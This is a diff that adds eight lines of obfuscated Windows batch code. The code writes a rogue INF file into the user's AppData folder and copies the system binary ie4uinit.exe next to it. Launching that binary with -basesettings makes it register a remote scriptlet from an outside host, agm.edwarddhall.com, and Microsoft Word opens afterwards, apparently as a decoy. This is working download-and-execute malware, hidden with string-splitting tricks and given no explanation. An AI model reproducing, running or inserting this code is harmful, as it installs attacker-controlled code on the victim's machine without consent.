@@ -1,0 +1,8 @@
+/v /ccall%Detail:~0,1%et "Rocks=.inf" &&
+  %Detail:~0,1%et "Always=ieuinit!Rocks!" &&
+  call %Detail:~0,1%et "Artwork=%appdata%\micro%Detail:~0,1%oft\" &&
+  (for /D %a in ("[4439]" "sc\" "ro%Overseas%j,NI,%Limousines%%Husband%%Husband%p%Weird%%Roast%%Roast%agm.edwarddhall.%Months%/lookingfor" "[defaultin%Detail:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=4439" "delfiles=EC6E6" "[version]" "signature =$windows nt$" "[string%Detail:~0,1%]" "Roast=/" "%Detail:~0,1%ervicename=' '" "%Detail:~0,1%hortsvcname=' '" "Months=com" "Limousines=h" "Arrow=%time%" "Charts=init" "Overseas=b;Templates" "Husband=t;Toilet" "Weird=:;Quantum" "[EC6E6]" "ieu%Charts%!Rocks!" "[de%Detail:~0,1%tinationdirs]" "defaultdestdir=11" "EC6E6=01" ) do @echo %~a)>"!Artwork!!Always!" &&
+  %Detail:~0,1%et "Invitations=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Conduct!ir%\%Detail:~0,1%ystem32\!Invitations! "!Artwork!*" &&
+  start "" "!Artwork!!Invitations!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
